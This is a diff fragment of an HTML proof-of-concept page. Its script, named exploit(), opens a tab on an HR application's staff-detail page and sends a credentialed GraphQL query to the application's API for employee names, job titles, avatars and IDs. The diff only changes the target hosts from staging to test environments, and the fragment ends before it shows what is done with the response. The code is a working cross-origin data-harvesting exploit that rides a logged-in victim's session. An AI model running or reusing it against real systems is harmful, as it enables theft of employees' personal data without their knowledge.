@@ -12,7 +12,7 @@
 <script>
 
         function exploit(){
-            window.open("https://staging.epowerhr.be/web/PA/WhoIsWho/ViewDetail/1")
+            window.open("https://app-itest.epowerhr.dev/web/PA/WhoIsWho/ViewDetail/1")
             document.getElementById("btn1").remove()
             document.getElementById("header1").innerText = "Please wait..."
 
@@ -21,7 +21,7 @@
 
         async function getData(){
             data = {"query":"query MyQuery {\r\n  commonPersons {\r\n    items {\r\n      avatar\r\n      avatarUrl\r\n      firstName\r\n      culture\r\n      id\r\n      isCurrentUser\r\n      jobTitle\r\n      lastName\r\n      preferredName\r\n      name\r\n    }\r\n    amount\r\n  }\r\n}\r\n","variables":{}}
-            url = "https://staging-api.epowerhr.be/graphql"
+            url = "https://api-itest.epowerhr.be/graphql"
 
             fetch(url, {
                 credentials: 'include',
